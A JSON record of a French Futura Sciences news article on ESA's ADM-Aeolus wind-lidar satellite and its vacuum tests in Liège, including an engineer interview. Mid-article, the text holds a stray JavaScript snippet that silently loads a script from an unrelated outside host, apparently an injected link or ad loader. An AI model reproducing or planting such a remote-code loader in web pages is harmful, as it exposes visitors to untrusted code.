{"title": "Un satellite inédit pour mesurer les vents", "newspaper": "Futura Sciences", "author": "Rémy Decourt", "date_publi": "22/11/2017", "content": "Mesurer les vents depuis l'orbite est un rêve de météorologue mais personne n'y est pour l'instant parvenu. Airbus Defence and Space est en passe de réussir avec ADM-Aeolus, capable de tirer des impulsions laser avec Aladin, un des instruments les plus sophistiqués jamais lancé en orbite. Ce satellite très spécial subit actuellement des tests très pointus, comme nous l'explique Isabelle Domken, ingénieure au Centre spatial de Liège. Ce qu'il faut retenir Pour ce satellite inédit, les essais au sol doivent être très poussés. Après Planck en 2009, c'est la deuxième fois que le Centre spatial de Liège est utilisé pour tester un satellite complet dans ses installations. À quelques mois de son transfert au  Centre spatial guyanais , ADM-Aeolus subit actuellement ses derniers essais. Ce satellite de l'Agence spatiale européenne sera lancé en janvier 2018 par un  lanceur  Vega pour une mission inédite. Il sera le premier satellite au monde à fournir quotidiennement des profils de vent à l'échelle du Globe. Actuellement, les informations sur les  vents  sont obtenues par l'observation des températures à bord de  ballons  sondes, donc à faible résolution, ou par des mesures directes qui ne couvrent pas l'entièreté du Globe.  La conception de ce satellite, une première mondiale, a pris plus de dix ans. Aux États-Unis, un projet similaire a été abandonné, faute d'avoir réussi à maîtriser la technologie nécessaire. Construit par Airbus Defence and Space, il est actuellement installé au Centre spatial de Liège (CSL) où il subit ses essais dits de vide thermique et de simulation spatiale. C'est-à-dire que sont reproduites dans une cuve les conditions spatiales dans lesquelles évoluera ADM-Aeolus.  Habituellement, nous évoquons très peu  ces essais  dans nos articles, procédure tout à fait classique dans la vie d'un satellite et parfaitement maîtrisée au sol. Cette fois, il nous a paru intéressant d'en parler car l'instrument d'ADM-Aeolus sera un des plus sophistiqués jamais mis en  orbite . Aladin, c'est son nom, comprend deux puissants lasers, un grand  télescope  d'1,5 mètre et des récepteurs très sensibles pour mesurer la  vitesse  des vents terrestres par couches horizontales jusqu'à 30 km d'altitude. Actuellement, l’essai sous vide sur le satellite ADM-Aeolus dans la cuve Focal5 a débuté le 30 octobre et doit durer 33 jours en continu. Une fois ces essais terminés, le satellite sera ramené à Toulouse pour les derniers contrôles avant d'être expédié en Guyane où il prendra place sur un lanceur Vega. © ESA, Centre spatial de Liège                               L'effet Doppler indiquera la vitesse des vents Pour réaliser ses mesures, Aladin utilisera son  laser  qui enverra de brèves impulsions de  lumière  intense dans l' atmosphère . Une partie de la lumière rétrodiffusée par les  molécules  de  gaz , particules de poussières et gouttelettes d'eau sera collectée par le télescope et envoyée au récepteur. En analysant le signal, il sera possible de calculer la vitesse et la direction de l' air  en  mouvement  à différentes altitudes dans l'atmosphère.   ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Comme le souligne Anders Elfving, responsable du programme Aladin à l' ESA ,  « nous avons encore quelques étapes critiques à mener. Nous avons besoin de la preuve ultime que le laser et le système optique complexe fonctionnent bien avec les radiateurs thermiques du satellite, et dans des conditions de vide » . L'observation précise des vents exige en effet de nombreuses mesures dont on calcule la moyenne.  « Il faut compter 700 impulsions laser pour chaque profil de vent. »  Isabelle Domken, project Manager et ingénieur au Centre spatial de Liège nous explique le rôle du CSL et les essais de l'instrument Aladin. Le saviez-vous ? Chaque satellite testé au sol subit trois types d’essais : Essais mécaniques (vibrations, chocs, acoustiques, mesures physiques) ;  Essais électriques (CEM, antennes, réseaux électriques, amagnétisme) ; Essais thermiques (vide thermique, simulation spatiale, mesures de déformées). Pourquoi le Centre spatial de Liège a été choisi pour tester ce satellite ? Isabelle Domken :  En 2003, le CSL a réalisé les premiers essais sur l'instrument Aladin. À ce moment-là, l'instrument Aladin était testé seul et n'était pas encore intégré dans le satellite. Comme les développements de l'instrument (notamment la mise au point du laser) prenaient du retard, Airbus a décidé de tester l'instrument Aladin avec le satellite et de ne faire qu'un seul test de simulation sous vide. La cuve Focal 5 avait démontré un niveau de propreté extrêmement bon lors des premiers tests sur Aladin, il a été décidé en 2012 de modifier le set-up de test (le support pour poser le satellite, la tente thermique, le palonnier pour transférer le satellite) prévu pour Aladin et de l'adapter (l'agrandir) pour tester le satellite complet. Le Centre spatial de Liège a-t-il des compétences particulières pour tester ce satellite ? Isabelle Domken :  Oui. Et à plus d'un titre. Le CSL avait l'expérience et la mise au point des premiers essais sur l'instrument Aladin.  Le CSL dispose de bancs optiques très stables dans des cuves à vide, ce qui permet de réaliser des calibrations optiques sous vide.  Le CSL peut réguler 14 voies thermiques à des températures différentes en même temps. Cela permet ainsi d'alimenter des panneaux thermiques en face du satellite et d'être représentatif des conditions de l'espace que verra le satellite.  En quoi consistent les essais du laser de l'instrument Aladin et comment allez-vous le tester en condition de vol ? Isabelle Domken :  Un faisceau laser placé à l'extérieur de la cuve simule le faisceau retour, simulant ainsi artificiellement l' effet Doppler . Ce faisceau passe à travers un hublot et rentre dans la cuve à vide vers l'instrument. Dans ce cas-ci, la  contamination  peut être extrêmement critique : tout le matériel qui se trouve dans la cuve a été chauffé à plus de 80 °C durant 9 heures minimum (même les bandes adhésives type Kapton, en  aluminium ). La présence d' oxygène  dans la cuve est une première au CSL. Le satellite a en effet une purge à l'oxygène au niveau du plan focal. Ce courant d'oxygène permet d'éviter que la contamination ne vienne se coller sur les optiques quand le laser  UV  est allumé (c'est la LIC,  laser Induced Contamination ). Or, l'oxygène et l'huile ne font pas bon ménage : le mélange est explosif. Ce gaz est évacué par des pompes qui ont dû être modifiées, avec l'ajout d'une purge à l' azote  pour réduire suffisamment la proportion d'oxygène. Des calculs thermiques ont été faits au niveau des panneaux thermiques pour limiter les  gradients  thermiques, des calculs par éléments finis ont été réalisés lors du design du support du satellite afin d'avoir un niveau de  vibration  minimum. Comment se déroulent les tests ? Isabelle Domken :  Bien. Les premiers allumages du laser sont en cours. Nous croisons les doigts pour que la calibration en vide thermique de ce satellite exceptionnel se passe au mieux car cet objet est unique au monde et exceptionnel par ses performances et les résultats qu'il fournira en  climatologie . Kézako : comment prévoir la météo ?                       Les prévisions météorologiques font appel à de nombreux facteurs : analyse des vents, de la pression atmosphérique, des températures, etc. Unisciel et l'université de Lille 1 nous expliquent, durant cet épisode de Kézako, comment les scientifiques prédisent le temps qu’il pourra faire dans les prochains jours.                                       ", "theme": "sciences"}